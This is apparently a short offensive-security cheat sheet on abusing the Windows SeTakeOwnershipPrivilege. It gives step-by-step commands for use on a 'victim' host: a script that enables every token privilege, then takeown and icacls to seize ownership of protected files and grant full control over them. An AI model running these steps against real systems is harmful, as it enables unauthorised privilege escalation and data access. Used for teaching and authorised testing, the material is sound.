 SeTakeOwnershipPrivilege allows a user to grant "**Write Owner"** over any object, this means we can eligible add our-self as owner of a particular object.
The permission is only given to Administrators by default.

### How to enable?
```
In GPO: 
Computer Configuration > Windows Settings > Security Settings > Local Policies > User Rights Assignment > Take Ownership of files or other objects.
```

1)Transfer the script to the victim
2)Run the script in order to gain Privilege if you still donÂ´t have them
```
Import-Module .\Enable-Privilege.ps1
.\EnableAllTokenPrivs.ps1
whoami /priv
```
3)Check permission on a Interesting File or Folder
```
cmd /c dir /q 'PATH/TO/FOLDER'
```
4)Take ownership
```
takeown /f 'PATH/TO/FILE/OR/FOLDER'
```
5)If you still can't open then you need to change permissions on FS
```
icacls 'PATH/TO/FILE/OR/FOLDER' /grant USERNAME:F
```
